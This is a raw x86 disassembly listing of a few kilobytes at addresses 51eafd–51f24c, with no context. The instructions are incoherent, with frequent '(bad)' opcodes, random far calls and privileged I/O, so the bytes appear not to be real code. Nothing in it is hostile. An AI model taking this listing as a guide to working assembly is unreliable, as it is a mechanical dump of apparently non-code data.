  51eafd:	sbb    DWORD PTR [ebx+0x21],0xa48e8aea
  51eb04:	mov    ?,WORD PTR [ebp-0x67cd4a7c]
  51eb0a:	mov    DWORD PTR [edx-0x31],eax
  51eb0d:	adc    dl,BYTE PTR [eax+0x73]
  51eb10:	and    BYTE PTR [eax-0x57],dl
  51eb13:	shr    esi,0xe4
  51eb16:	popa   
  51eb17:	iret   
  51eb18:	xchg   edx,eax
  51eb19:	jge    0x51eaac
  51eb1b:	aas    
  51eb1c:	mov    dh,0x4e
  51eb1f:	mov    al,0xe1
  51eb21:	jle    0x51eacc
  51eb23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51eb24:	adc    al,0xf5
  51eb26:	mov    cl,0xd1
  51eb28:	jbe    0x51eacd
  51eb2a:	ror    DWORD PTR [esi-0x1a],cl
  51eb2d:	clc    
  51eb2e:	test   dl,0xea
  51eb31:	jg     0x51ead3
  51eb33:	jge    0x51eb63
  51eb35:	push   eax
  51eb36:	jmp    FWORD PTR [ebp+eax*4-0x1480335c]
  51eb3d:	or     ebp,DWORD PTR ds:0x96e8cdf5
  51eb43:	enter  0xa783,0xa8
  51eb47:	retf   0x320
  51eb4a:	mov    ebp,0x199e3ab1
  51eb4f:	icebp  
  51eb50:	cmp    DWORD PTR [ebp+0x7248300b],eax
  51eb56:	jg     0x51ebba
  51eb58:	retf   0x20d2
  51eb5b:	mov    bl,0x3c
  51eb5d:	hlt    
  51eb5e:	and    BYTE PTR [esi-0x56],dl
  51eb61:	(bad)  
  51eb63:	call   FWORD PTR [ecx+0xc5fcb4b]
  51eb69:	or     ebp,edi
  51eb6b:	jns    0x51eb3d
  51eb6d:	mov    ds:0xb8d627b6,eax
  51eb72:	jg     0x51eb7d
  51eb74:	inc    edx
  51eb75:	int3   
  51eb76:	daa    
  51eb77:	mov    eax,0x83744e5
  51eb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51eb7d:	mov    dl,0x52
  51eb7f:	jl     0x51eb81
  51eb81:	and    eax,DWORD PTR [eax+edx*8]
  51eb84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51eb85:	scas   al,BYTE PTR es:[edi]
  51eb86:	aad    0xaf
  51eb88:	cmp    eax,edx
  51eb8a:	xor    BYTE PTR [ebx],bh
  51eb8c:	add    DWORD PTR [edi],esi
  51eb8e:	sahf   
  51eb8f:	iret   
  51eb90:	imul   ebx,DWORD PTR [edx-0xd74c5e9],0x6
  51eb97:	and    bh,BYTE PTR [esi]
  51eb99:	in     al,0x30
  51eb9b:	pop    esi
  51eb9c:	lock xchg esi,eax
  51eb9e:	cmc    
  51eb9f:	ins    DWORD PTR es:[edi],dx
  51eba0:	mov    ds:0x852ecdfb,al
  51eba5:	sub    bh,BYTE PTR [ebx+esi*2-0x4556bfd5]
  51ebac:	mov    dl,ah
  51ebae:	adc    eax,0xc20f17a0
  51ebb3:	mov    bh,0x70
  51ebb5:	push   0xbc55485d
  51ebba:	ret    0x16ba
  51ebbd:	aaa    
  51ebbe:	loopne 0x51ec34
  51ebc0:	stos   DWORD PTR es:[edi],eax
  51ebc1:	(bad)  
  51ebc2:	mov    ebx,0xc780263a
  51ebc7:	fdivr  DWORD PTR ds:0x9b9c5bbd
  51ebcd:	mov    eax,ds:0x8a2fa75b
  51ebd2:	mov    bl,BYTE PTR [eax]
  51ebd4:	inc    edi
  51ebd5:	mov    bl,0x62
  51ebd7:	icebp  
  51ebd8:	mov    al,0x91
  51ebda:	push   0xab278861
  51ebdf:	jp     0x51ebe0
  51ebe1:	aas    
  51ebe2:	fsub   st,st(4)
  51ebe4:	clc    
  51ebe5:	in     eax,0x7e
  51ebe7:	pop    eax
  51ebe8:	sub    DWORD PTR [esi+ecx*1],ecx
  51ebeb:	(bad)  
  51ebec:	xor    eax,0x7a7271be
  51ebf1:	(bad)  
  51ebf2:	arpl   WORD PTR [ebp+esi*8-0x31],cx
  51ebf6:	push   edi
  51ebf7:	mov    esp,0x880a2a00
  51ebfc:	pop    esi
  51ebfd:	dec    bp
  51ebff:	mov    WORD PTR ds:0x741820bd,fs
  51ec05:	sbb    esi,ebp
  51ec07:	jae    0x51ec65
  51ec09:	daa    
  51ec0a:	fdiv   DWORD PTR [ecx-0x6f]
  51ec0d:	xor    al,0x11
  51ec0f:	xchg   DWORD PTR fs:[ebp-0x69],esp
  51ec13:	xor    BYTE PTR [esi-0x61],ah
  51ec16:	and    eax,0x8d1b3610
  51ec1b:	pop    es
  51ec1c:	sub    al,0xc3
  51ec1e:	and    edi,esp
  51ec20:	and    ebx,DWORD PTR [ecx+0x30c82757]
  51ec26:	out    dx,eax
  51ec27:	js     0x51ebd8
  51ec29:	jp     0x51eca4
  51ec2b:	jo     0x51ec5b
  51ec2d:	mov    fs,WORD PTR [ecx-0x37]
  51ec30:	and    eax,0x82239d0a
  51ec35:	in     eax,0xad
  51ec37:	and    eax,0x7629c5b6
  51ec3c:	popw   ss
  51ec3e:	(bad)  
  51ec3f:	pop    esi
  51ec40:	or     esi,esp
  51ec42:	mov    ch,0x53
  51ec44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ec45:	push   esp
  51ec46:	add    BYTE PTR [ecx+0x768fa987],dh
  51ec4c:	aas    
  51ec4d:	aam    0x6e
  51ec4f:	mov    cl,0x6d
  51ec51:	mov    gs,ebp
  51ec53:	cmp    esp,DWORD PTR [esi-0x6128a005]
  51ec59:	inc    eax
  51ec5a:	jo     0x51ec19
  51ec5c:	scas   al,BYTE PTR es:[edi]
  51ec5d:	icebp  
  51ec5e:	in     al,dx
  51ec5f:	jmp    0x51ec6b
  51ec61:	aam    0xae
  51ec63:	mov    al,ds:0x156b5529
  51ec68:	jae    0x51ec7a
  51ec6a:	jne    0x51ecb5
  51ec6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ec6d:	loope  0x51ecda
  51ec6f:	scas   al,BYTE PTR es:[edi]
  51ec70:	loopne 0x51ec39
  51ec72:	cmp    bl,BYTE PTR [edx+eax*4+0x57]
  51ec76:	pop    edx
  51ec77:	add    eax,0xece02f13
  51ec7c:	mov    ebx,0x36bdc723
  51ec81:	aas    
  51ec82:	inc    edx
  51ec83:	ins    DWORD PTR es:[edi],dx
  51ec84:	cdq    
  51ec85:	ret    
  51ec86:	and    ecx,DWORD PTR [ebx-0x2d15f0ec]
  51ec8c:	outs   dx,BYTE PTR ds:[esi]
  51ec8d:	or     al,0x90
  51ec8f:	sbb    BYTE PTR [eax+ecx*1-0x750dca14],al
  51ec96:	jne    0x51ed04
  51ec98:	xor    eax,0x4869d169
  51ec9d:	mov    ch,0x3
  51ec9f:	pusha  
  51eca0:	repz jp 0x51ed1f
  51eca3:	push   ss
  51eca4:	test   DWORD PTR [eax],ebx
  51eca6:	inc    ebx
  51eca7:	imul   DWORD PTR [ecx+0x4c]
  51ecaa:	ss scas eax,DWORD PTR es:[edi]
  51ecac:	xchg   edi,eax
  51ecad:	shr    DWORD PTR [edi-0x3fba2bae],cl
  51ecb3:	mov    esi,0xc5de1533
  51ecb8:	cld    
  51ecb9:	pop    edx
  51ecba:	js     0x51ec80
  51ecbc:	dec    edi
  51ecbd:	dec    ebp
  51ecbe:	jg     0x51ec7b
  51ecc0:	xchg   BYTE PTR [esi-0x32acccac],dl
  51ecc6:	adc    esi,esp
  51ecc8:	test   al,0x26
  51ecca:	xchg   BYTE PTR [edi-0x4d68a246],bl
  51ecd0:	add    DWORD PTR [ebp+0x622f43b8],ebx
  51ecd6:	mov    DWORD PTR [esi+0x4ffbdf33],edx
  51ecdc:	push   esp
  51ecdd:	adc    dh,BYTE PTR [edi+0x62]
  51ece0:	sub    bh,0x81
  51ece3:	ds out dx,al
  51ece5:	cmp    ebp,ebp
  51ece7:	dec    edx
  51ece8:	xchg   esp,eax
  51ece9:	or     al,0xeb
  51eceb:	call   0x848a8f03
  51ecf0:	imul   edi,eax,0xc4981602
  51ecf6:	fisub  WORD PTR [eax-0x7]
  51ecf9:	mov    DWORD PTR [eax],esp
  51ecfb:	push   edi
  51ecfc:	cmp    ecx,DWORD PTR [esi]
  51ecfe:	sub    al,0xfb
  51ed00:	jnp    0x51ed5e
  51ed02:	aam    0x54
  51ed04:	jge    0x51ed60
  51ed06:	mov    ch,0x3
  51ed08:	inc    esp
  51ed09:	mov    ecx,0x42686116
  51ed0e:	xchg   ebx,eax
  51ed0f:	icebp  
  51ed10:	jmp    0xc009644e
  51ed15:	sbb    al,BYTE PTR [esi+esi*4+0x2f41f024]
  51ed1c:	and    eax,DWORD PTR [ecx+eax*4-0x11]
  51ed20:	daa    
  51ed21:	or     ecx,DWORD PTR [edx]
  51ed23:	test   eax,0xb348d24
  51ed28:	xor    DWORD PTR [ebp+0x11],esi
  51ed2b:	mov    ebx,edx
  51ed2d:	mov    ah,bl
  51ed2f:	mov    bh,0xc6
  51ed31:	push   cs
  51ed32:	adc    DWORD PTR [ecx-0xe],edx
  51ed35:	push   edx
  51ed36:	pusha  
  51ed37:	inc    eax
  51ed38:	lods   al,BYTE PTR ds:[esi]
  51ed39:	cmp    ebp,edi
  51ed3b:	sahf   
  51ed3c:	ja     0x51ecef
  51ed3e:	add    al,0x61
  51ed40:	mov    edi,0x4b7b0060
  51ed45:	xchg   ebp,eax
  51ed46:	jmp    0x51ed5a
  51ed48:	test   BYTE PTR [esi-0x45],bh
  51ed4b:	or     BYTE PTR [ebx+0x441ba322],dl
  51ed51:	lds    ebp,FWORD PTR ds:0xe798930c
  51ed57:	xchg   edi,eax
  51ed58:	mov    ds:0xc10f206e,eax
  51ed5d:	out    0x34,al
  51ed5f:	mov    al,BYTE PTR [esi+0x10]
  51ed62:	pop    esi
  51ed63:	add    ebp,DWORD PTR [eax-0x2b68d911]
  51ed69:	mov    DWORD PTR [edx-0x18],esp
  51ed6c:	test   al,0x4c
  51ed6e:	hlt    
  51ed6f:	or     bh,BYTE PTR [esi-0x6e]
  51ed72:	stos   DWORD PTR es:[edi],eax
  51ed73:	add    edi,DWORD PTR [esi+edx*1-0x29]
  51ed77:	inc    ecx
  51ed78:	push   0xb3a610db
  51ed7d:	xchg   DWORD PTR [ebp+0x46611de0],edi
  51ed83:	push   ecx
  51ed84:	js     0x51ed42
  51ed86:	(bad)  
  51ed87:	repz imul ebx,DWORD PTR [ecx-0x33e6065e],0x24
  51ed8f:	adc    BYTE PTR [eax+0x69ec50a5],bh
  51ed95:	iret   
  51ed96:	adc    al,bh
  51ed98:	cmp    edi,ecx
  51ed9a:	mov    al,ds:0x573c3b90
  51ed9f:	call   0xdcdc:0x928d57fa
  51eda6:	cmp    BYTE PTR [ebx+esi*1-0x1],0xbd
  51edab:	adc    eax,0x9af40767
  51edb0:	push   cs
  51edb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51edb2:	mov    al,ds:0xed1b13ac
  51edb7:	sti    
  51edb8:	push   ebx
  51edb9:	out    dx,al
  51edba:	iret   
  51edbb:	mov    WORD PTR [esi-0x68],?
  51edbe:	inc    esp
  51edbf:	fistp  QWORD PTR [edi+0x1b]
  51edc2:	or     al,0xa9
  51edc4:	xchg   esp,eax
  51edc5:	push   eax
  51edc6:	xchg   ebx,eax
  51edc7:	mov    BYTE PTR [ebp+0x59c6584f],ah
  51edcd:	(bad)  
  51edce:	out    dx,al
  51edcf:	inc    edx
  51edd0:	xchg   edi,eax
  51edd1:	mov    dl,0x35
  51edd3:	pop    es
  51edd4:	cmp    esi,DWORD PTR [ebx-0x34be2480]
  51edda:	add    al,0xe4
  51eddc:	and    al,0xee
  51edde:	add    al,0xeb
  51ede0:	mov    eax,0xb4167010
  51ede5:	test   al,0x60
  51ede7:	add    al,0xc3
  51ede9:	iret   
  51edea:	dec    eax
  51edeb:	xor    edx,DWORD PTR [ebx-0x41]
  51edee:	jmp    0x51edb9
  51edf0:	popa   
  51edf1:	fs ss jle 0x51ee65
  51edf5:	xchg   ebx,eax
  51edf6:	jecxz  0x51ee32
  51edf8:	(bad)  
  51edf9:	push   eax
  51edfa:	(bad)  
  51edfb:	mov    ebp,0xe27ff35a
  51ee00:	call   0x8790:0x3fa1068
  51ee07:	hlt    
  51ee08:	mov    ds:0x48203e3d,al
  51ee0d:	dec    ebp
  51ee0e:	xchg   BYTE PTR [edi],al
  51ee10:	jne    0x51ee6e
  51ee12:	outs   dx,DWORD PTR ds:[esi]
  51ee13:	std    
  51ee14:	and    DWORD PTR [esi-0x32],ebx
  51ee17:	test   eax,0x89a0130b
  51ee1c:	retf   
  51ee1d:	push   0xa92d90fd
  51ee22:	imul   esp,DWORD PTR [edx+0x4],0x123853c6
  51ee29:	pop    esp
  51ee2a:	push   ecx
  51ee2b:	mov    ecx,0x8a3a9710
  51ee30:	jno    0x51edc3
  51ee32:	pop    ss
  51ee33:	mov    bl,0x23
  51ee35:	sub    eax,0x65eab770
  51ee3a:	nop
  51ee3b:	push   ebp
  51ee3c:	ss sub eax,0x223fe8bd
  51ee42:	fwait
  51ee43:	and    bh,BYTE PTR [ebp-0x51188cdd]
  51ee49:	mov    cl,dl
  51ee4b:	pop    es
  51ee4c:	xchg   ebp,eax
  51ee4d:	push   cs
  51ee4e:	cdq    
  51ee4f:	mov    BYTE PTR [eax+edi*2+0x1238358e],bh
  51ee56:	mov    eax,ds:0x1ba3264
  51ee5b:	and    DWORD PTR [esi-0x4144992f],edi
  51ee61:	ins    DWORD PTR es:[edi],dx
  51ee62:	xchg   edi,eax
  51ee63:	jne    0x51ee32
  51ee65:	xchg   DWORD PTR [edx+0x39],ecx
  51ee68:	sahf   
  51ee69:	(bad)  
  51ee6a:	lods   eax,DWORD PTR ds:[esi]
  51ee6b:	xchg   DWORD PTR [eax-0x320dc1d5],edi
  51ee71:	popa   
  51ee72:	dec    esp
  51ee73:	dec    esi
  51ee74:	xchg   esi,eax
  51ee75:	nop
  51ee76:	adc    bl,dh
  51ee78:	jb     0x51eec4
  51ee7a:	clc    
  51ee7b:	jno    0x51ee25
  51ee7d:	out    dx,al
  51ee7e:	adc    cl,BYTE PTR [ecx-0x5d]
  51ee81:	inc    eax
  51ee82:	fidivr DWORD PTR [edx+0x304ccc04]
  51ee88:	out    dx,al
  51ee89:	je     0x51ef08
  51ee8b:	adc    al,0xc2
  51ee8d:	jnp    0x51ee59
  51ee8f:	pop    ebx
  51ee90:	cdq    
  51ee91:	mov    edi,0x8b53d593
  51ee96:	nop
  51ee97:	pop    ebp
  51ee98:	shr    DWORD PTR [edx+0x57],cl
  51ee9b:	lods   eax,DWORD PTR ds:[esi]
  51ee9c:	dec    ebx
  51ee9d:	cs in  al,dx
  51ee9f:	(bad)  
  51eea1:	mov    dl,BYTE PTR [edx+eax*8+0x29f723bc]
  51eea8:	or     ecx,ecx
  51eeaa:	lahf   
  51eeab:	and    esi,ebx
  51eead:	les    edi,FWORD PTR [ebx+0x4b]
  51eeb0:	lock out dx,eax
  51eeb2:	daa    
  51eeb3:	xchg   BYTE PTR [ebx+0xd9bf447],dh
  51eeb9:	loop   0x51ef2f
  51eebb:	mov    ecx,0x13efcb6c
  51eec0:	js     0x51eeb5
  51eec2:	pop    fs
  51eec4:	jp     0x51ee75
  51eec6:	xchg   ebx,eax
  51eec7:	jge    0x51ef32
  51eec9:	xor    esp,DWORD PTR [eax-0x12a2cdaf]
  51eecf:	and    DWORD PTR [ebx-0x7a],ebp
  51eed2:	pop    ebx
  51eed3:	fdiv   DWORD PTR [eax]
  51eed5:	cs leave 
  51eed7:	(bad)  
  51eed8:	cs out dx,eax
  51eeda:	retf   
  51eedb:	repz int 0xd9
  51eede:	mov    edx,0xeedf5a9b
  51eee3:	sub    eax,0xccba3091
  51eee8:	sbb    edi,esp
  51eeea:	ficomp WORD PTR [ebx-0x5313703a]
  51eef0:	into   
  51eef1:	das    
  51eef2:	dec    esi
  51eef3:	mov    WORD PTR [ebp+0x48],fs
  51eef6:	out    dx,eax
  51eef7:	ins    BYTE PTR es:[edi],dx
  51eef8:	stc    
  51eef9:	(bad)  
  51eefb:	gs out dx,eax
  51eefd:	shl    edi,0x13
  51ef00:	cld    
  51ef01:	lahf   
  51ef02:	xor    eax,0x1dfc7da4
  51ef07:	fidivr DWORD PTR [ebp+0x6e]
  51ef0a:	dec    esp
  51ef0b:	push   edx
  51ef0c:	or     edx,DWORD PTR [edi-0x61]
  51ef0f:	clc    
  51ef10:	fstp   TBYTE PTR [ebp+0x60]
  51ef13:	test   BYTE PTR [edi-0x2dbc91db],cl
  51ef19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ef1a:	shl    DWORD PTR [esi+edx*8+0x44b2cdbf],1
  51ef21:	adc    eax,0x727fdf22
  51ef26:	retf   0xb134
  51ef29:	pop    ecx
  51ef2a:	jbe    0x51eebf
  51ef2c:	ins    BYTE PTR es:[edi],dx
  51ef2d:	repz je 0x51ef62
  51ef30:	xlat   BYTE PTR ds:[ebx]
  51ef31:	(bad)  
  51ef32:	out    0xd9,al
  51ef34:	mov    ss:0xea1c8abc,eax
  51ef3a:	inc    esi
  51ef3b:	pop    es
  51ef3c:	stos   BYTE PTR es:[edi],al
  51ef3d:	test   eax,ecx
  51ef3f:	repnz popa 
  51ef41:	mov    dh,0x49
  51ef43:	inc    ebx
  51ef44:	popf   
  51ef45:	or     BYTE PTR [ecx-0x3],cl
  51ef48:	gs jmp 0x51ef27
  51ef4b:	nop
  51ef4c:	outs   dx,BYTE PTR ds:[esi]
  51ef4d:	fimul  DWORD PTR [esi+ebx*8]
  51ef50:	icebp  
  51ef51:	lea    ebp,[edi+0x4]
  51ef54:	mov    esp,0x1368618c
  51ef59:	shl    DWORD PTR [ecx],0xc
  51ef5c:	ins    BYTE PTR es:[edi],dx
  51ef5d:	push   cs
  51ef5e:	lahf   
  51ef5f:	loope  0x51ef5a
  51ef61:	aaa    
  51ef62:	mov    ebp,0xa0c2b418
  51ef67:	and    al,0x91
  51ef69:	dec    ebx
  51ef6a:	(bad)  
  51ef6b:	xor    al,0x10
  51ef6d:	mov    bl,0x38
  51ef6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ef70:	inc    ecx
  51ef71:	jmp    0x8fdfcdc8
  51ef76:	pop    ss
  51ef77:	pop    edx
  51ef78:	and    eax,0xec7d398e
  51ef7d:	xchg   ebx,eax
  51ef7e:	icebp  
  51ef7f:	xor    bh,BYTE PTR [esp+edx*4+0x54]
  51ef83:	fidiv  WORD PTR [esi]
  51ef85:	rep ins BYTE PTR es:[edi],dx
  51ef87:	enter  0xfff,0xaa
  51ef8b:	push   cs
  51ef8c:	push   edx
  51ef8d:	and    BYTE PTR [ebx+ecx*4],cl
  51ef90:	mov    ebp,DWORD PTR [edx+ebx*4]
  51ef93:	inc    BYTE PTR [edi+0x779bdf9c]
  51ef99:	cmp    dh,BYTE PTR [eax-0x6]
  51ef9c:	cmp    ebp,DWORD PTR [ebp-0x6b]
  51ef9f:	sbb    al,0x93
  51efa1:	js     0x51efd6
  51efa3:	or     al,0x34
  51efa5:	shr    BYTE PTR [eax],cl
  51efa7:	mov    cl,0xd2
  51efa9:	fsubr  st,st(6)
  51efab:	push   ebx
  51efac:	pop    es
  51efad:	or     edx,DWORD PTR [eax+0x5ed0e244]
  51efb3:	popa   
  51efb4:	xor    ebx,DWORD PTR [edi+ecx*2]
  51efb7:	fadd   QWORD PTR [edi]
  51efb9:	scas   eax,DWORD PTR es:[edi]
  51efba:	jno    0x51efb9
  51efbc:	add    dh,ah
  51efbe:	xchg   edi,eax
  51efbf:	push   edx
  51efc0:	test   al,0x16
  51efc2:	(bad)  
  51efc3:	jb     0x51efee
  51efc5:	scas   al,BYTE PTR es:[edi]
  51efc6:	popf   
  51efc7:	test   BYTE PTR [ebp+0x19],ah
  51efca:	loope  0x51f009
  51efcc:	pop    ds
  51efcd:	push   DWORD PTR [ecx]
  51efcf:	cli    
  51efd0:	mov    DWORD PTR [eax+0x58618d12],esp
  51efd6:	es push ds
  51efd8:	retf   
  51efd9:	add    eax,0x1a1adfc4
  51efde:	jg     0x51ef84
  51efe0:	inc    edi
  51efe1:	pop    ss
  51efe2:	sbb    al,BYTE PTR [ebp-0x42]
  51efe5:	mov    WORD PTR [edx+0x70cd8881],ss
  51efeb:	nop
  51efec:	push   eax
  51efed:	xchg   esi,eax
  51efee:	sahf   
  51efef:	repz ror BYTE PTR [ebx+0x24a8860e],cl
  51eff6:	add    cl,BYTE PTR [ecx]
  51eff8:	fld    st(3)
  51effa:	fist   DWORD PTR [ecx-0x5afc6a8a]
  51f000:	and    cl,al
  51f002:	sbb    DWORD PTR [eax],eax
  51f004:	mov    WORD PTR [eax-0x413e080b],es
  51f00a:	jno    0x51f05a
  51f00c:	arpl   WORD PTR [eax-0x5c7a44a9],bp
  51f012:	jle    0x51f01c
  51f014:	xchg   ecx,eax
  51f015:	push   DWORD PTR [esi-0xd]
  51f018:	cli    
  51f019:	nop
  51f01a:	cli    
  51f01b:	inc    edi
  51f01c:	call   0x6577:0x154e561
  51f023:	and    al,0xce
  51f025:	outs   dx,DWORD PTR ds:[esi]
  51f026:	loopne 0x51f093
  51f028:	xchg   esi,eax
  51f029:	or     DWORD PTR [eax],eax
  51f02b:	sub    BYTE PTR [esi+0x3fab2f5e],0x87
  51f032:	or     BYTE PTR [edx-0x6777e6c2],bh
  51f038:	push   esp
  51f039:	add    eax,DWORD PTR [edx]
  51f03b:	ror    DWORD PTR ds:[eax-0x11],0x79
  51f040:	push   eax
  51f041:	lahf   
  51f042:	pop    ds
  51f043:	and    edi,eax
  51f045:	das    
  51f046:	fist   DWORD PTR [ebp+0x4c]
  51f049:	scas   eax,DWORD PTR es:[edi]
  51f04a:	or     al,0x9a
  51f04c:	int3   
  51f04d:	fiadd  DWORD PTR [ecx-0x2c]
  51f050:	ins    BYTE PTR es:[edi],dx
  51f051:	or     cl,BYTE PTR ds:0xc0896335
  51f057:	adc    eax,0x8848a30b
  51f05c:	jns    0x51f0cc
  51f05e:	sbb    bl,BYTE PTR [edx+ebp*4+0x292c56ac]
  51f065:	lock mov ebx,0x605e4f
  51f06b:	dec    BYTE PTR [eax+0x2f7e17eb]
  51f071:	mov    al,ds:0xc30a6e35
  51f076:	call   0xcef:0x9ffb4c88
  51f07d:	aas    
  51f07e:	jne    0x51f084
  51f080:	fdiv   QWORD PTR [edi-0x74f398d2]
  51f086:	adc    dh,BYTE PTR [esi+0x2c]
  51f089:	dec    esi
  51f08a:	retf   0x3ae
  51f08d:	or     al,0xa0
  51f08f:	inc    ecx
  51f090:	lods   eax,DWORD PTR ds:[esi]
  51f091:	cmp    eax,0x88fa5549
  51f096:	fcomip st,st(0)
  51f098:	hlt    
  51f099:	mov    dl,0xb6
  51f09b:	repz push 0x32
  51f09e:	mov    dl,0x27
  51f0a0:	pop    ds
  51f0a1:	out    dx,eax
  51f0a2:	adc    BYTE PTR [esi+eax*2],bh
  51f0a5:	xlat   BYTE PTR ds:[ebx]
  51f0a6:	leave  
  51f0a7:	sbb    ebp,ecx
  51f0a9:	ins    DWORD PTR es:[edi],dx
  51f0aa:	jge    0x51f126
  51f0ac:	xchg   ebx,eax
  51f0ad:	mov    edx,DWORD PTR [ebx+esi*4+0xe]
  51f0b1:	dec    ecx
  51f0b2:	out    0x99,eax
  51f0b4:	push   ss
  51f0b5:	jmp    0x51f0e9
  51f0b7:	mov    bl,0x4
  51f0b9:	je     0xad0dd23b
  51f0bf:	and    cl,BYTE PTR [ecx+0x54e23b4]
  51f0c5:	(bad)  
  51f0c6:	jp     0x51f11d
  51f0c8:	cmc    
  51f0c9:	or     eax,0xfe92a665
  51f0ce:	add    DWORD PTR [edi],esi
  51f0d0:	inc    eax
  51f0d1:	cmp    ebx,DWORD PTR [ecx]
  51f0d3:	adc    edx,DWORD PTR [ebx-0x8]
  51f0d6:	neg    cl
  51f0d8:	bndldx bnd3,[edx+0x46a64c25]
  51f0df:	mov    eax,0xc04dd5fc
  51f0e4:	shr    DWORD PTR [ebx+0x3abb3a13],cl
  51f0ea:	cmp    al,0xbc
  51f0ec:	jecxz  0x51f114
  51f0ee:	cld    
  51f0ef:	stos   BYTE PTR es:[edi],al
  51f0f0:	mov    ch,0x2e
  51f0f2:	ja     0x51f118
  51f0f4:	ret    0xc10b
  51f0f7:	push   es
  51f0f8:	test   DWORD PTR [ebx],0x33b486f
  51f0fe:	or     BYTE PTR [ecx],ah
  51f100:	xor    dh,BYTE PTR [ebx+0xe]
  51f103:	rcl    DWORD PTR [edi*1+0x17fd96e0],0x4
  51f10b:	xor    BYTE PTR ds:0xc7b29244,0x99
  51f112:	test   eax,0x8b8e11c1
  51f117:	and    DWORD PTR [ecx],eax
  51f119:	jb     0x51f0c4
  51f11b:	fistp  DWORD PTR [eax+0x33]
  51f11e:	retf   
  51f11f:	outs   dx,DWORD PTR ds:[esi]
  51f120:	jae    0x51f101
  51f122:	jg     0x51f102
  51f124:	mov    ebx,0x1d06184f
  51f129:	pop    eax
  51f12a:	sub    al,0xb7
  51f12c:	iret   
  51f12d:	adc    edx,DWORD PTR [edi]
  51f12f:	xchg   esi,eax
  51f130:	(bad)  ds:0xbe691501
  51f136:	retf   
  51f137:	pop    ebp
  51f138:	sbb    eax,0x48516864
  51f13d:	fbstp  TBYTE PTR [ebx-0x7fa0a4ab]
  51f143:	rcr    BYTE PTR [ecx],1
  51f145:	mov    DWORD PTR [edi],eax
  51f147:	dec    eax
  51f148:	inc    edi
  51f149:	imul   BYTE PTR [edi+0x31]
  51f14c:	pop    ebp
  51f14d:	dec    eax
  51f14e:	adc    esi,ecx
  51f150:	pop    ds
  51f151:	in     eax,0xdd
  51f153:	fstp   QWORD PTR [esi+0x64]
  51f156:	mov    edx,0xa970716
  51f15b:	pop    ebx
  51f15c:	cs ins DWORD PTR es:[edi],dx
  51f15e:	loop   0x51f0fd
  51f160:	imul   edi,DWORD PTR [edx+0x78acb615],0x6e64b834
  51f16a:	aam    0x58
  51f16c:	js     0x51f1e5
  51f16e:	(bad)  
  51f170:	int    0x3f
  51f172:	inc    ebp
  51f173:	xor    ch,BYTE PTR [ecx+0x6ef1cdaa]
  51f179:	jno    0x51f1c2
  51f17b:	jmp    0x51f163
  51f17d:	mov    WORD PTR [edx-0x80],?
  51f180:	mov    dh,0x5d
  51f182:	mov    al,0x9b
  51f184:	cmp    DWORD PTR [ecx+0x63],0x64
  51f188:	adc    bh,cl
  51f18a:	pop    ebp
  51f18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51f18c:	out    0x6e,eax
  51f18e:	ja     0x51f156
  51f190:	cmp    BYTE PTR [edx],ah
  51f192:	push   esi
  51f193:	adc    BYTE PTR [esi],0x54
  51f196:	shl    ah,cl
  51f198:	stc    
  51f199:	mov    DWORD PTR [ebp+0x25],ecx
  51f19c:	scas   al,BYTE PTR es:[edi]
  51f19d:	hlt    
  51f19e:	jo     0x51f1b2
  51f1a0:	std    
  51f1a1:	adc    BYTE PTR [eax-0x7f],ch
  51f1a4:	pop    ebx
  51f1a5:	imul   esi,DWORD PTR [eax],0x8cfa9b74
  51f1ab:	lds    esp,FWORD PTR [eax]
  51f1ad:	fs and al,0xf3
  51f1b0:	push   esp
  51f1b1:	and    esp,DWORD PTR [eax]
  51f1b3:	test   al,0x9b
  51f1b5:	fidivr WORD PTR [ecx]
  51f1b7:	in     al,dx
  51f1b8:	imul   DWORD PTR gs:[ebx-0x44]
  51f1bc:	cmp    eax,0x517738d8
  51f1c1:	repnz add DWORD PTR [eax],ebx
  51f1c4:	das    
  51f1c5:	clc    
  51f1c6:	out    dx,eax
  51f1c7:	adc    eax,0x55309667
  51f1cc:	mov    ebx,0xff9338fe
  51f1d1:	popa   
  51f1d2:	hlt    
  51f1d3:	add    eax,0xa2cae2b9
  51f1d8:	cwde   
  51f1d9:	dec    BYTE PTR [ebx-0x27]
  51f1dc:	(bad)  
  51f1dd:	cmp    bh,bh
  51f1df:	outs   dx,BYTE PTR ds:[esi]
  51f1e0:	jnp    0x51f248
  51f1e2:	lods   eax,DWORD PTR ds:[esi]
  51f1e3:	sbb    BYTE PTR ds:0xa1d5ad0c,dl
  51f1e9:	inc    edi
  51f1ea:	out    0x49,eax
  51f1ec:	dec    eax
  51f1ed:	adc    al,0xcf
  51f1ef:	sub    cl,al
  51f1f1:	pop    ds
  51f1f2:	xchg   ecx,eax
  51f1f3:	pop    ebx
  51f1f4:	test   eax,0x1663c613
  51f1f9:	xchg   esp,eax
  51f1fa:	xor    BYTE PTR [edi+edx*1],0x14
  51f1fe:	inc    esp
  51f1ff:	fmul   DWORD PTR [edi]
  51f201:	sub    eax,0x630ec0c3
  51f206:	push   es
  51f207:	jo     0x51f1c3
  51f209:	push   cs
  51f20a:	addr16 ss pushf 
  51f20d:	repz gs in eax,0x78
  51f211:	push   ss
  51f212:	dec    ebx
  51f213:	mov    DWORD PTR [esi+0xb774a56],edi
  51f219:	jl     0x51f1b3
  51f21b:	mov    edx,0x1e218e3c
  51f220:	jl     0x51f24c
  51f222:	cdq    
  51f223:	(bad)  
  51f224:	jmp    0x51f218
  51f226:	xor    BYTE PTR [ecx],al
  51f228:	jmp    0x70585a85
  51f22d:	mov    edi,esp
  51f22f:	inc    eax
  51f230:	icebp  
  51f231:	call   0x96ea06c6
  51f236:	aad    0x49
  51f238:	pop    es
  51f239:	pop    edx
  51f23a:	inc    ebp
  51f23b:	repz popf 
  51f23d:	loope  0x51f1d6
  51f23f:	or     DWORD PTR [ebx],ebx
  51f241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51f242:	sbb    al,0xad
  51f244:	xchg   ecx,eax
  51f245:	call   0x8326:0xea0cee72
  51f24c:	lds    ecx,FWORD PTR [edi]
